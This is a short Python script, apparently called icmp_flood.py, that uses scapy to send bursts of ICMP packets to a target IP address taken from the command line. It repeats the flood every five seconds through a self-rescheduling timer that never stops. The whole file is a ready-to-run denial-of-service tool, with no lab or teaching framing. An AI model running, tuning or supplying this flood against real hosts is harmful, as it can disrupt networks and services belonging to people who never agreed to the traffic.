from scapy.all import ICMP, send, IP
import threading
import sys


NUM_OF_PACKETS = 50
INTERVAL_BETWEEN_PACKETS_SECS = 0.01
INTERVAL_BETWEEN_FLOOD_SECS = 5
TARGET_IP = None

def ping_flood():
    try:
        print(f"Sending {NUM_OF_PACKETS} packets with a delay of"+\
            f" {INTERVAL_BETWEEN_PACKETS_SECS} seconds to {TARGET_IP}")
        packet = IP(dst=TARGET_IP)/ICMP()
        send(packet, count=NUM_OF_PACKETS, inter=INTERVAL_BETWEEN_PACKETS_SECS, verbose=1)
    except ValueError:
        print("Please enter valid numbers for the count and delay.")

def repeat_function():
    # Define a function that repeats the given function with the specified interval
    ping_flood()  # Execute the function immediately
    threading.Timer(
        INTERVAL_BETWEEN_FLOOD_SECS, 
        repeat_function).start()

# Example usage
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 icmp_flood.py TARGET_IP")
        sys.exit(1)

    network = "192.168.1.0/24"  # Specify your network    
    TARGET_IP = sys.argv[1]  # Get the TARGET_IP from the command line arguments
   
    repeat_function()
        

